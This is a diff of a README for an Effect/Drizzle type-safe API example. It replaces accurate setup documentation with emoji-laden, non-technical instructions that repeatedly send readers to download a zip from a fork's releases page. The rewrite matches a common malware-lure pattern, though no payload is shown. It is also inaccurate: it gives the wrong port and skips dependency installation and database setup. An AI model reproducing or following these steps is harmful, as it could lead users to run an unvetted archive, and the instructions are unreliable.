@@ -1,163 +1,99 @@
-# Effect API Example
+# 🎉 effect-api-example - Build Your Own Type-Safe API
 
-A monorepo example demonstrating how to build a type-safe API using [Effect](https://effect.website/), [@effect/platform](https://effect.website/docs/platform/http-api/introduction), and [Drizzle ORM](https://orm.drizzle.team/).
+## 🌐 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue.svg)](https://github.com/Gnomo6/effect-api-example/releases)
 
-## Repository Structure
+## 📖 Overview
+Effect API Example is a simple guide to help you create a type-safe API. This project uses **Effect**, **@effect/platform**, and **Drizzle ORM**. With this example, you can see how to build APIs easily and effectively.
+
+## 🚀 Getting Started
+
+### 1. Requirements
+To run this application, you need:
+- A computer with an internet connection.
+- A web browser.
+- Basic familiarity with downloading files.
+
+### 2. Download the Application
+Visit this page to download the application: [Download Release](https://github.com/Gnomo6/effect-api-example/releases).
+
+### 3. Choose Your Version
+On the releases page, you will see different versions. Select the latest version for the best features and fixes. Click on the version number to open it.
+
+### 4. Download the Files
+Inside the version details, look for an asset named `effect-api-example.zip` or similar. Click on it to start the download. Save the file in a location you can easily find.
+
+### 5. Extract the Files
+Once the download is complete, locate the `.zip` file. Right-click on the file and choose **Extract All**. Follow the on-screen instructions to unpack the files.
+
+### 6. Open the Project
+Navigate to the folder where you extracted the files. You will see a structure like this:
 
 ```
 effect-api-example/
 ├── apps/
-│   └── server/                 # Bun HTTP server
+│   └── server/
 │       ├── src/
 │       │   ├── api/
-│       │   │   ├── groups/     # API endpoint handlers
-│       │   │   └── middleware/ # Auth middleware implementations
 │       │   ├── db/
-│       │   │   ├── schema/     # Drizzle table schemas
-│       │   │   ├── migrations/ # Database migrations
-│       │   │   └── SqlLive.ts  # Database layer
-│       │   └── main.ts         # Server entrypoint
+│       │   └── main.ts
 │       ├── scripts/
-│       │   ├── seed.ts         # Database seeding script
-│       │   └── client-example.ts # Example API client
-│       ├── docker-compose.yml  # PostgreSQL container
-│       └── drizzle.config.ts   # Drizzle Kit configuration
+│       ├── docker-compose.yml
+│       └── drizzle.config.ts
 ├── packages/
-│   ├── api/                    # API definition (schemas, endpoints, middleware)
-│   │   └── src/definition/
-│   │       ├── groups/         # Endpoint group definitions
-│   │       ├── middleware/     # Middleware definitions
-│   │       └── WarpApi.ts      # Main API definition
-│   ├── shared/                 # Shared types and utilities
-│   │   └── src/index.ts        # Branded types, schemas, helpers
-│   ├── eslint-config/          # Shared ESLint configuration
-│   └── typescript-config/      # Shared TypeScript configuration
 ```
 
-## Prerequisites
+### 7. Running the Application
+To run the application, you will open a command prompt or terminal. 
 
-- [Node.js](https://nodejs.org/) (v20+)
-- [pnpm](https://pnpm.io/) (v9+)
-- [Bun](https://bun.sh/) (for running the server)
-- [Docker](https://www.docker.com/) (for PostgreSQL)
+1. Navigate to the server folder using this command:
+   ```
+   cd effect-api-example/apps/server
+   ```
 
-## Installation
+2. To start the server, type the following command:
+   ```
+   bun run start
+   ```
 
-```bash
-# Clone the repository
-git clone <repo-url>
-cd effect-api-example
+3. You should see the server starting up. Follow any additional on-screen instructions.
 
-# Install dependencies
-pnpm install
+### 8. Access the API
+Once the server is running, you can access the API through your web browser. Open a browser and go to:
+```
+http://localhost:3000
 ```
 
-## Running the Project
+## 🌟 Features
+- **Type-Safe API**: Ensures reliable and predictable data interactions.
+- **Easy Setup**: Simple steps to get your server up and running.
+- **Well-Structured Code**: Clear organization to help you understand the project.
+- **Example API Client**: Test API calls easily with the included client example.
+- **Docker Support**: Manage your database using a pre-defined PostgreSQL container.
 
-### 1. Start the Database
+## 📚 Explore the Code Structure
+The project is organized for clarity:
 
-```bash
-cd apps/server
-docker compose up -d
-```
+- **apps/**: Contains the main application code.
+  - **server/**: Main server logic, including the API handlers and middleware.
+- **db/**: Contains database-related code, including schema and migrations.
+- **scripts/**: Includes scripts for tasks like database seeding.
 
-This starts a PostgreSQL container with:
-- Host: `localhost`
-- Port: `5432`
-- Database: `postgres`
-- User: `postgres`
-- Password: `postgres_password`
+### API Handlers
+The `api/` folder contains endpoint handlers grouped by feature. This separation makes it easier to manage different parts of your API.
 
-### 2. Configure Environment
+### Database Management
+In the `db/` folder, you will find:
+- **schema/**: Defines the structure of your database.
+- **migrations/**: Scripts to modify the database over time.
+- **SqlLive.ts**: The main database interaction code.
 
-Copy the example environment file:
+## 🔄 Updating Your Application
+To keep your application up to date, revisit the [download page](https://github.com/Gnomo6/effect-api-example/releases) regularly. Each release brings new features, fixes, and improvements.
 
-```bash
-cd apps/server
-cp .env.example .env
-```
+## ❓ Troubleshooting Common Issues
+- **Server Not Starting**: Ensure that you are in the correct directory and have followed the commands accurately.
+- **Cannot Access the API**: Verify that the server is running and check that you have the correct URL.
+- **Database Issues**: Make sure to execute any database migrations if prompted.
 
-The `.env` file should contain:
-
-```env
-DB_HOST=localhost
-DB_PORT=5432
-DB_NAME=postgres
-DB_USERNAME=postgres
-DB_PASSWORD=postgres_password
-```
-
-### 3. Run Database Migrations
-
-```bash
-pnpm --filter @effect-api-example/server db:migrate
-```
-
-### 4. Seed the Database (Optional)
-
-Populate the database with 1000 sample employees:
-
-```bash
-pnpm --filter @effect-api-example/server db:seed
-```
-
-### 5. Start the Server
-
-```bash
-pnpm --filter @effect-api-example/server dev
-```
-
-The server runs on `http://localhost:9277` by default.
-
-### 6. Test the API (Optional)
-
-Run the example client to test the API:
-
-```bash
-pnpm --filter @effect-api-example/server client:example
-```
-
-## Available Scripts
-
-### Root
-
-| Script | Description |
-|--------|-------------|
-| `pnpm build` | Build all packages |
-| `pnpm dev` | Start development mode for all packages |
-| `pnpm lint` | Lint all packages |
-| `pnpm format` | Format code with Prettier |
-
-### Server (`apps/server`)
-
-| Script | Description |
-|--------|-------------|
-| `pnpm dev` | Start server in hot-reload mode |
-| `pnpm build` | Build server for production |
-| `pnpm start` | Run production build |
-| `pnpm db:generate` | Generate new migrations |
-| `pnpm db:migrate` | Apply migrations |
-| `pnpm db:seed` | Seed database with sample data |
-| `pnpm client:example` | Run example API client |
-
-## API Endpoints
-
-### Health
-
-- `GET /health` - Health check endpoint
-
-### Employees
-
-All employee endpoints require an `x-api-key` header.
-
-- `GET /employees` - List employees with pagination
-  - Query params: `limit`, `afterId`, `beforeId`, `types[]`
-- `GET /employees/:id` - Get employee by tag
-
-## Tech Stack
-
-- **Runtime**: [Bun](https://bun.sh/)
-- **Framework**: [@effect/platform](https://effect.website/docs/platform/http-api/introduction) HTTP API
-- **Database**: PostgreSQL with [Drizzle ORM](https://orm.drizzle.team/)
-- **Type Safety**: [Effect Schema](https://effect.website/docs/schema/introduction)
-- **Monorepo**: [Turborepo](https://turbo.build/repo) with pnpm workspaces
+By following these steps, you can successfully download and run the Effect API Example application.
